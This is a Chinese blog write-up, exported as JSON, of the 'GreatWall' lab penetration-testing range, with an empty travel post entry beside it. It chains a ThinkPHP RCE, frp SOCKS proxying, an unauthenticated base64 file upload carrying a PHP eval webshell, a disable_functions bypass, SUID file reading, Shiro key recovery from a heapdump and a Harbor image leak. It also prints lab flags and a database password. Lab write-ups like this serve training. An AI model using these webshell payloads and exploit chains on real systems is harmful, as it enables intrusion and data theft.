[{"content":" 在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartLink公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了6个Flag，它们分布在不同的靶机上，您需要找到并获取这些 Flag 作为您的成就目标。\n前置知识 建议把以下知识点吃透再去打靶机，建立综合渗透思维\nthinkphp5023\nHeapdump内存分析、Shiro 反序列化\n代码审计\nfrp代理、二层代理、proxifire全局流量代理\n蚁剑绕过disable_functions\nKubernetes API server 未授权\nHarbor 公开镜像仓库未授权访问 CVE-2022-46463（1.x \u0026lt;= Harbor \u0026lt;= 2.5.3）\nMySQL UDF 提权\n拓扑图 8.130.71.173-公网入口 使用fscan进行扫描\n8.130.71.173:22 open 8.130.71.173:8080 open 8.130.71.173:80 open [] WebTitle http://8.130.71.173 code:200 len:10887 title:\u0026quot;\u0026quot; [] WebTitle http://8.130.71.173:8080 code:200 len:1027 title:Login Form [+] PocScan http://8.130.71.173:8080 poc-yaml-thinkphp5023-method-rce poc1\n发现8080端口存在thinkphp5023-method-rce漏洞，工具getshell一把梭\nifconfig\n公网：8.130.71.173\n内网：172.28.23.17\n根目录拿到第一个flag\n1 flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada} 传fscan扫内网172.28.23.0/24网段\n提取关键信息\n[+] ftp 172.28.23.26:21:anonymous\n[-\u0026gt;]OASystem.zip\n[+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file\n[+] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2\n内网一层代理 frp设置代理\n公网vps\nfrps\n[common] bind_port = 7000\nwebshell/8.130.71.173\nfrpc\n[common] server_addr = 公网服务器地址 server_port = 7000\n[socks5] type = tcp remote_port = 6000 plugin = socks5\nproxifier全局流量代理\n具体可见文章：关于内网代理、vm、frp、proxifier全局流量转发等问题\n172.28.23.26-新翔0A [+] ftp 172.28.23.26:21:anonymous\n[-\u0026gt;]OASystem.zip\nftp匿名登录，到本地\n进行代码审计，很明显的文件上传\n引入db.php和checklogin.php文件\ncheck.php，设置cookie：id=1;loginname=1;jueseid=1;danweiid=1;quanxian=1，就能登录main.php，下面的upload可以不用登录进行上传，导致这个代码审计结果用处不大\ncheck.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php function islogin(){ if(isset($_COOKIE[\u0026#39;id\u0026#39;])\u0026amp;\u0026amp;isset($_COOKIE[\u0026#39;loginname\u0026#39;])\u0026amp;\u0026amp;isset($_COOKIE[\u0026#39;jueseid\u0026#39;])\u0026amp;\u0026amp;isset($_COOKIE[\u0026#39;danweiid\u0026#39;])\u0026amp;\u0026amp;isset($_COOKIE[\u0026#39;quanxian\u0026#39;])){ if($_COOKIE[\u0026#39;id\u0026#39;]!=\u0026#39;\u0026#39;\u0026amp;\u0026amp;$_COOKIE[\u0026#39;loginname\u0026#39;]!=\u0026#39;\u0026#39;\u0026amp;\u0026amp;$_COOKIE[\u0026#39;jueseid\u0026#39;]!=\u0026#39;\u0026#39;\u0026amp;\u0026amp;$_COOKIE[\u0026#39;danweiid\u0026#39;]!=\u0026#39;\u0026#39;\u0026amp;\u0026amp;$_COOKIE[\u0026#39;quanxian\u0026#39;]!=\u0026#39;\u0026#39;){ return true; } else { return false; } } else { return false; } } ?\u0026gt; uploadbase64.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php /** * Description: PhpStorm. * Author: yoby * DateTime: 2018/12/4 18:01 * Email:logove@qq.com * Copyright Yoby版权所有 */ $img = $_POST[\u0026#39;imgbase64\u0026#39;]; if (preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $img, $result)) { $type = \u0026#34;.\u0026#34;.$result[2]; $path = \u0026#34;upload/\u0026#34; . date(\u0026#34;Y-m-d\u0026#34;) . \u0026#34;-\u0026#34; . uniqid() . $type; } $img = base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $img)); @file_put_contents($path, $img); exit(\u0026#39;{\u0026#34;src\u0026#34;:\u0026#34;\u0026#39;.$path.\u0026#39;\u0026#34;}\u0026#39;); 格式为data:image;base64,xxx，就能够上传(post)\nimgbase64=data:image/php;base64,PD89YCRfR0VUWzFdYDtldmFsKCRfUE9TVFsxXSk7Pz4=\n上webshell，回显ret=127，使用蚁剑的disable_functions插件绕过\n自动新建/var/www/html/OAsystem/upload/.antproxy.php和/tmp/.90482ant_x64.so文件\n上传1.php的get型马，让.antproxy.php指向1.php，使能get利用\n1 \u0026lt;?php eval($_GET[1]);?\u0026gt; .antproxy.php的37行修改为1.php的路径\nifconfig\n172.28.23.26\n172.22.14.6\nget方式传，看到flag02.txt，不能直接cat读取\nfind / -perm -u=s -type f 2\u0026gt;/dev/null，看suid权限\n可以利用base32，解码flag-\u0026gt;\n1 flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28} 172.28.23.33-ERP后台 [+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file\n访问/actuator/heapdump路径得到heapdump文件\njava -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump解密，找到key的值\nalgMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES\naes加密，内定key，猜测是shiro框架，工具一把梭\n在/home/ops01/目录发现HashNote文件，以及在基础信息搜集阶段发现59696监听端口，pwn题目\n172.28.23.33:59696 对pwn还没学，这题先放这吧\n1 flag03 172.22.14.0/24 传fscan，扫内网，浏览器界面不方便操作，蚁剑换成PHP7_Backtrace_UAF绕过，这个模式可以用命令行，但不稳定\nfscan对于172.22.14.0/24网段信息收集\n这里少了k8s的机器，可能是环境出问题了，等有沙砾了再重新打一次\n内网二层代理 8.130.71.173-公网入口\nfrps\n[common] bind_port = 7000\n172.28.23.26\nfrpc\n[common] server_addr =172.28.23.17 server_port = 7000\n[socks5] type = tcp remote_port = 6000 plugin = socks5\n172.22.14.37-k8s API未授权 靶机未拉起\n1 flag04 172.22.14.46-harbor 公开信息泄露漏洞去打\n在413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49包下找到flag\n1 flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf} 继续分析run.sh，兔子洞\n分析其他镜像找线索，project/projectadmin镜像下找到另一份带有ProjectAdmin-0.0.1-SNAPSHOT.jar包的文件\n反编译，找到了数据库密码\n172.22.10.28\nspring.datasource.username=root spring.datasource.password=My3q1i4oZkJm3\nnavicate都能连接，工具梭哈连接不到，真是奇怪\n没时间了，等沙砾赞够了再继续打吧\n1 flag06 ","date":"2024-12-19T20:50:49+08:00","image":"https://flowers-boy.github.io/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/GreatWall_hu14316944900030153767.png","permalink":"https://flowers-boy.github.io/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/","title":"春秋云境-GreatWall综合渗透"},{"content":"","date":"2024-12-16T23:38:05+08:00","image":"https://flowers-boy.github.io/p/%E6%97%85%E6%B8%B8/%E5%B0%81%E9%9D%A2_hu1947443830664069740.jpg","permalink":"https://flowers-boy.github.io/p/%E6%97%85%E6%B8%B8/","title":"旅游"}]